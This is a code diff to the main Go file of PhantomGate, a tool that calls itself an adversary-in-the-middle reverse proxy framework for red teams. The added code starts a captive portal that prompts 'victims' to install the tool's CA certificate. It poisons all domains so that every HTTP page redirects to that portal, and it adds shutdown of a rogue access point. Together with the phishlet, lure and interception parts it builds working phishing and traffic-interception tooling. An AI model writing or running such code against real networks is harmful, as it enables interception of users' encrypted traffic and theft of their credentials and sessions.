@@ -24,6 +24,8 @@ import (
 	"github.com/phantomgate/phantomgate/internal/store"
 )
 
+var version = "1.0.0"
+
 const banner = `
    ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
@@ -40,7 +42,7 @@ const banner = `
 
    ─────────────────────────────────────────────────
      AiTM Reverse Proxy Framework for Red Teams
-     Version: 1.0.0 | Cross-Platform (Linux/Win/Mac)
+     Version: %s | Cross-Platform (Linux/Win/Mac)
    ─────────────────────────────────────────────────
 `
 
@@ -82,7 +84,7 @@ func main() {
 
 	flag.Parse()
 
-	fmt.Print(banner)
+	fmt.Printf(banner, version)
 
 	// Interactive wizard mode for LAN interception
 	if *wizardMode {
@@ -235,6 +237,25 @@ func main() {
 		log.Printf("[CA] CA cert for victim installation: %s", phantomCA.CACertPath())
 	}
 
+	// === CAPTIVE PORTAL ===
+	var captivePortalInstance *portal.CaptivePortal
+	if *captivePortalFlag && phantomCA != nil {
+		caCertPEM, err := os.ReadFile(phantomCA.CACertPath())
+		if err != nil {
+			log.Fatalf("[FATAL] Failed to read CA cert for captive portal: %v", err)
+		}
+		portalAddr := fmt.Sprintf("%s:%d", cfg.ListenIP, cfg.HTTPPort)
+		gw := *gatewayIP
+		if gw == "" {
+			gw = cfg.ListenIP
+		}
+		captivePortalInstance = portal.NewCaptivePortal(caCertPEM, portalAddr, gw)
+		if err := captivePortalInstance.Start(); err != nil {
+			log.Fatalf("[FATAL] Captive portal failed: %v", err)
+		}
+		log.Printf("[CAPTIVE PORTAL] Active — victims will be prompted to install CA cert")
+	}
+
 	// Initialize the AiTM reverse proxy
 	phantomProxy := proxy.NewPhantomProxy(cfg, activePhishlet, dataStore, lureGen)
 
@@ -267,19 +288,21 @@ func main() {
 	}
 	fmt.Println()
 
-	// Start HTTP → HTTPS redirect server
-	go func() {
-		redirectMux := http.NewServeMux()
-		redirectMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-			target := "https://" + r.Host + r.URL.RequestURI()
-			http.Redirect(w, r, target, http.StatusMovedPermanently)
-		})
-		addr := phantomProxy.GetHTTPAddr()
-		log.Printf("[→] HTTP redirect listener on %s", addr)
-		if err := http.ListenAndServe(addr, redirectMux); err != nil {
-			log.Printf("[!] HTTP redirect listener failed: %v", err)
-		}
-	}()
+	// Start HTTP → HTTPS redirect server (skip if captive portal is using port 80)
+	if captivePortalInstance == nil {
+		go func() {
+			redirectMux := http.NewServeMux()
+			redirectMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+				target := "https://" + r.Host + r.URL.RequestURI()
+				http.Redirect(w, r, target, http.StatusMovedPermanently)
+			})
+			addr := phantomProxy.GetHTTPAddr()
+			log.Printf("[→] HTTP redirect listener on %s", addr)
+			if err := http.ListenAndServe(addr, redirectMux); err != nil {
+				log.Printf("[!] HTTP redirect listener failed: %v", err)
+			}
+		}()
+	}
 
 	// Start operator dashboard
 	go func() {
@@ -391,6 +414,12 @@ func main() {
 		if err := interceptSuite.Start(); err != nil {
 			log.Fatalf("[FATAL] Failed to start interception: %v", err)
 		}
+
+		// When captive portal is active, poison ALL domains so any HTTP page
+		// redirects to the portal (not just the target phishlet domains)
+		if captivePortalInstance != nil {
+			interceptSuite.SetPoisonAll(true)
+		}
 	}
 
 	fmt.Println("  ⚡ PhantomGate is LIVE. Waiting for victims...")
@@ -406,9 +435,19 @@ func main() {
 
 	fmt.Println("\n  [!] Shutting down PhantomGate...")
 
-	// Stop interception first (restore network state)
+	// Stop captive portal
+	if captivePortalInstance != nil {
+		captivePortalInstance.Stop()
+	}
+
+	// Stop interception (restore network state)
 	if interceptSuite != nil {
 		interceptSuite.Stop()
+	}
+
+	// Stop rogue AP
+	if rogueAPInstance != nil {
+		rogueAPInstance.Stop()
 	}
 
 	fmt.Println("  [✓] All data saved. Goodbye.")
